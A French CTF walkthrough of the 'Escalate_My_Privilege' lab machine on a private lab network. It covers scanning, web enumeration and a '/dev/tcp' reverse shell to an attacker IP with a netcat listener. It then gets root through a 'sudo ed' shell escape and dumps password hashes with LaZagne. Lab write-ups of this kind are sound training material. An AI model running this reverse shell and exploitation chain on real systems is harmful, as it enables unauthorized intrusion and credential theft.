\# Escalate_My_Privilege

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $sudo massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️  Nmap 192.168.56.254...100%
 
[+] 22/tcp open
[+] 80/tcp open
[+] 111/tcp open
[+] 2049/tcp open
 
==========================================================
|                         📑 Rapports                    |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.254-tcp.html     |
==========================================================
```

&nbsp;

<span style="color: #dddddd;">👊</span> **Gobuster**

```
┌─[m0rph3u5@parrot]─[~/Documents/metaWeb]
└──╼ $gobuster dir -u http://192.168.56.254 -w /usr/share/wordlists/dirb/big.txt -x html,php,txt,zip,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.254
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,zip,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html        (Status: 403) [Size: 215]
/index.html           (Status: 200) [Size: 240]
/phpinfo.php          (Status: 200) [Size: 51562]
/readme.txt           (Status: 200) [Size: 39]
/robots.txt           (Status: 200) [Size: 37]
/robots.txt           (Status: 200) [Size: 37]
Progress: 143283 / 143290 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">🌍</span> Curl**

```
┌─[m0rph3u5@parrot]─[~/Documents/metaWeb]
└──╼ $curl http://192.168.56.254/robots.txt
User-agent: *
Disallow: /phpbash.php
```

&nbsp;

![Capture du 2025-09-25 19-56-09.png](../../_resources/Capture%20du%202025-09-25%2019-56-09.png)

Reverse shell utiliser

```
sh -i >& /dev/tcp/192.168.56.149/4444 0>&1
```

&nbsp;

**<span style="color: #dddddd;">🐾</span> Netcat**

J’ouvre le port `4444` pour que  je puisse avoir un shell sur la machine distance

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.56.254 35226
sh: no job control in this shell
sh-4.2$ 
```

&nbsp;

**<span style="color: #dddddd;">🕳️</span> MD5 encode**

```
bash-4.2$ echo -n “rootroot1” | md5sum
echo -n “rootroot1” | md5sum
b7bc8489abe360486b4b19dbc242e885 -
```

&nbsp;

&nbsp;Authentification `armour`

```
bash-4.2$ su - armour
su - armour
Password: b7bc8489abe360486b4b19dbc242e885
-bash-4.2$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
[armour@my_privilege ~]$
```

&nbsp;

🛰️ **fullEx**

Nous avons le choix pour l’élévation de privilège

```
[armour@my_privilege fullEx$]$ bash fullEx.sh -perm
[armour@my_privilege fullEx$]$ ./fullEx.sh -LinPeas

  
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x. 1 root root 75K Jun  9  2014 /usr/bin/ed
-rwsr-xr-x 1 root root 153K Feb  4  2020 /usr/bin/curl
-rwsr-xr-x. 1 root root 181K Jun  9  2014 /usr/bin/pic
-rwsr-xr-x 1 root root 73K Aug  8  2019 /usr/bin/chage
-rwsr-xr-x 1 root root 77K Aug  8  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 41K Aug  8  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 16K Aug  6  2019 /usr/bin/rpm
-rwsr-xr-x 1 root root 44K Dec  2  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rws--x--x 1 root root 24K Dec  2  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rws--x--x 1 root root 24K Dec  2  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 32K Dec  2  2019 /usr/bin/su
-rwsr-xr-x 1 root root 32K Dec  2  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 7.1K Aug  6  2019 /usr/bin/python2.7 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 24K Sep 13  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 57K Aug  8  2019 /usr/bin/crontab
-rwsr-xr-x. 1 root root 2.1K Jun  9  2014 /usr/bin/run-parts
-rwsr-xr-x 1 root root 543K Aug  8  2019 /usr/bin/openssl
-rwsr-xr-x 1 root root 801 Aug  8  2019 /usr/bin/yum (Unknown SUID binary!)
---s--x--x 1 root root 144K Feb 18  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 2.3M Aug  8  2019 /usr/bin/vim
-rwsr-xr-x 1 root root 17M Jun 18  2019 /usr/bin/node
-rwsr-xr-x 1 root root 1.4M Mar  7  2019 /usr/bin/fish
-rwsr-xr-x 1 root root 111K Oct 17  2018 /usr/bin/dash
-rwsr-xr-x 1 root root 4.5M Nov  1  2019 /usr/bin/php
-rwsr-xr-x 1 root root 485K Apr 25  2019 /usr/bin/rsync
-rwsr-xr-x 1 root root 414K Jun  9  2014 /usr/bin/tmux  --->  Tmux_1.3_1.4_privesc(CVE-2011-1496)
-rwsr-xr-x 2 root root 12K Jan 21  2019 /usr/bin/perl
-rwsr-xr-x 2 root root 12K Jan 21  2019 /usr/bin/perl5.16.3 (Unknown SUID binary!)
-rwsr-xr-x 113 root root 1.5M Jan 17  2020 /usr/bin/git
-rwsr-xr-x 113 root root 1.5M Jan 17  2020 /usr/bin/git-upload-archive (Unknown SUID binary!)
-rwsr-xr-x 1 root root 1.5M Mar 18  2020 /usr/bin/screen-4.5.0 (Unknown SUID binary!)
-rwsr-sr-x 1 root screen 465K Apr 10  2018 /usr/bin/screen.old (Unknown SUID binary!)
-rwsr-xr-x 1 root root 409K May 15  2019 /usr/bin/wget
-rwsr-xr-x 1 root root 28K Aug  8  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 16K Oct 30  2018 /usr/bin/rsh  --->  Apple_Mac_OSX_10.9.5/10.10.5(09-2015)
-rwsr-xr-x 1 root root 396K Aug  2  2017 /usr/bin/tcsh (Unknown SUID binary!)
-rwsr-xr-x 1 root root 95K May 25  2015 /usr/bin/rc
-rwsr-x--x 1 root rsshusers 28K Jan 23  2020 /usr/bin/rssh (Unknown SUID binary!)
-rwsr-xr-x 113 root root 1.5M Jan 17  2020 /usr/bin/git-receive-pack (Unknown SUID binary!)
-rwsr-xr-x 1 root root 2.1K Aug  8  2019 /usr/bin/vimtutor (Unknown SUID binary!)
-rwsr-xr-x 1 root root 202K Jun 10  2014 /usr/bin/nano
-rwsr-xr-x 1 root root 49K Jun  9  2014 /usr/bin/sed
-rwsr-xr-x 1 root root 89 Jun  9  2014 /usr/bin/red (Unknown SUID binary!)
-rwsr-xr-x 1 root root 86K Nov  5  2016 /usr/bin/ftp (Unknown SUID binary!)
-rwsr-xr-x 1 root root 7.1K Aug  8  2019 /usr/bin/ruby (Unknown SUID binary!)
-rwsr-xr-x 1 root root 211K Nov  5  2016 /usr/bin/zip
-rwsr-xr-x 2 root root 182K Aug  8  2019 /usr/bin/unzip
-rwsr-xr-x 1 root root 381K Aug  4  2017 /usr/bin/socat
-rwsr-xr-x 1 root root 24K Jan 10  2018 /usr/bin/rootsh (Unknown SUID binary!)
-rwsr-xr-x 1 root root 44K Sep 17  2019 /usr/bin/shc (Unknown SUID binary!)
-rwsr-xr-x 1 root root 139K Jan 15  2014 /usr/bin/shtool (Unknown SUID binary!)
-rwsr-xr-x 1 root root 4.0K Aug  8  2019 /usr/bin/targetcli (Unknown SUID binary!)
-rwsr-xr-x 1 root root 85K Mar 18  2019 /usr/bin/rlwrap
-rwsr-xr-x 1 root root 25K Sep  5  2016 /usr/bin/scponly (Unknown SUID binary!)
-rwsr-xr-x 1 root root 202K Mar 17  2015 /usr/bin/qalc (Unknown SUID binary!)
-rwsr-xr-x 1 root root 314 Aug  8  2019 /usr/bin/irb (Unknown SUID binary!)
-rwsr-xr-x 1 root root 7.0K Nov 20  2015 /usr/bin/tclsh8.5 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 12K Jun 23  2015 /usr/bin/expect
-rwsr-xr-x 1 root root 99K Nov  5  2016 /usr/bin/zipcloak (Unknown SUID binary!)
-rwsr-xr-x 1 root root 94K Nov  5  2016 /usr/bin/zipnote (Unknown SUID binary!)
-rwsr-xr-x 1 root root 98K Nov  5  2016 /usr/bin/zipsplit (Unknown SUID binary!)
-rwsr-xr-x 1 root root 32K Aug  8  2019 /usr/bin/funzip (Unknown SUID binary!)
-rwsr-xr-x 1 root root 89K Aug  8  2019 /usr/bin/unzipsfx (Unknown SUID binary!)
-rwsr-xr-x 1 root root 2.9K Oct 10  2008 /usr/bin/zipgrep (Unknown SUID binary!)
-rwsr-xr-x 2 root root 182K Aug  8  2019 /usr/bin/zipinfo (Unknown SUID binary!)
-rwsr-xr-x 1 root root 17K Feb 28  2016 /usr/bin/e3 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 199K May  6  2015 /usr/bin/dex (Unknown SUID binary!)
---s--x--- 1 root stapusr 208K Oct 18  2019 /usr/bin/staprun
-rwsr-xr-x 1 root root 6.6M Aug  8  2019 /usr/bin/gdb
-rwsr-xr-x 1 root root 1.3M Jan 10  2019 /usr/bin/elinks (Unknown SUID binary!)
-rwsr-xr-x 1 root root 41 Feb  6  2018 /usr/bin/7za (Unknown SUID binary!)
-rwsr-xr-x 1 root root 1.4M Jan 15  2010 /usr/bin/ncat (Unknown SUID binary!)
-rwsr-xr-x 1 root root 3.5M Jan 26  2010 /usr/bin/nmap
-rwsr-xr-x 1 root root 2.9M Apr 29  2019 /usr/bin/aria2c
-rwsr-xr-x 1 root root 5.0K Jan 21  2019 /usr/bin/cpan (Unknown SUID binary!)
-rwsr-xr-x 1 root root 1.9K Feb 13  2019 /usr/bin/dnf-2 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 120K Sep 12  2014 /usr/bin/nawk
-rwsr-xr-x 1 root root 282 Jan 29  2020 /usr/bin/pip (Unknown SUID binary!)
-rwsr-xr-t 1 root root 15M Nov  2  2018 /usr/bin/emacs-24.3 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 593 Feb 13  2015 /usr/bin/facter (Unknown SUID binary!)
-rwsr-xr-x 1 root root 28K Aug 29  2014 /usr/bin/finger (Unknown SUID binary!)
-rwsr-xr-x 1 root root 37K Apr 11  2018 /usr/bin/tftp
-rwsr-xr-x 1 root root 5.9M Apr 10  2018 /usr/bin/gimp-2.8 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 24K Jan  8  2020 /usr/bin/jq
-rwsr-xr-x 1 root root 210K Oct 30  2018 /usr/bin/ltrace (Unknown SUID binary!)
-rwsr-xr-x 1 root root 384K Apr 11  2018 /usr/bin/mailx (Unknown SUID binary!)
-rwsr-xr-x 1 root root 978K Feb 15  2018 /usr/bin/busybox
-rwsr-xr-x 1 root root 148K Sep 12  2014 /usr/bin/mawk
-rwsr-xr-x 1 root root 24K Nov 18  2015 /usr/bin/cpulimit
-rwsr-xr-x 1 root root 253 Aug 19  2014 /usr/bin/puppet (Unknown SUID binary!)
-rwsr-xr-x 1 root root 149K Dec  2  2019 /usr/bin/smbclient (Unknown SUID binary!)
-rwsr-xr-x 1 root root 636K Oct 30  2018 /usr/bin/strace
You own the SUID file: /usr/bin/user_hello
-rwsr-xr-x 1 root root 32K Oct 30  2018 /usr/bin/fusermount
-rwsr-xr-x 1 root root 953K Aug  6  2019 /usr/sbin/ldconfig
-rwsr-xr-x 1 root root 11K Apr 10  2018 /usr/sbin/pam_timestamp_check
-rwsr-xr-x 1 root root 36K Apr 10  2018 /usr/sbin/unix_chkpwd
-rwsr-xr-x 1 root root 64K Aug  8  2019 /usr/sbin/arp
-r-sr-xr-x 1 root root 150K Oct 18  2019 /usr/sbin/dmsetup
-rwsr-xr-x 1 root root 3.2K Aug  8  2019 /usr/sbin/service (Unknown SUID binary!)
-rwsr-xr-x 1 root root 12K Aug  8  2019 /usr/sbin/usernetctl
-rwsr-xr-x 1 root root 63K Jul 27  2019 /usr/sbin/iftop
-rwsr-xr-x 1 root root 847K Mar 18  2020 /usr/sbin/exim-4.84-3 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 84K Jun  9  2014 /usr/sbin/mtr
-rwsr-xr-x 1 root root 81K Aug  8  2019 /usr/sbin/ifconfig (Unknown SUID binary!)
-rwsr-xr-x 1 root root 115K Aug  8  2019 /usr/sbin/mount.nfs
```

&nbsp;

<span style="color: #dddddd;">#️⃣</span> **SUID - ed**

**https://gtfobins.github.io/gtfobins/ed/#sudo**

```
[armour@my_privilege fullEx]$ sudo ed
sudo ed
!/bin/sh
sh-4.2# python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
[root@my_privilege fullEx]# 
```

&nbsp;

🛰️ **fullEx**

```
root@my_privilege fullEx]# ./fullEx.sh -LaZagne
./fullEx.sh -LaZagne

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: armour
Hash: $6$ibscpEYi$A0bt4lJe4NdD8hqG6KrZs.I7nS6chM1mMP/6LtG/DlMQ30W8aQDSr9uM42jI8bGoEZCWUr87aalTQrkioxxQg/:18340:0:99999:7:::

[+] Hash found !!!
Login: root
Hash: $6$lYoxb/H/0LQ5d50Q$mM2ej4Um6zmkg11uszJrBpZo/vI4TT6nEvQnlnI/GlB9otfNIyN9xXfATAxVAUzj4ojTE1pmFbY12NUzw2j/b0:18313:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 4.26532411575
```

&nbsp;

Identifiant trouver

| User | password |
| --- | --- |
| armour | b7bc8489abe360486b4b19dbc242e885 |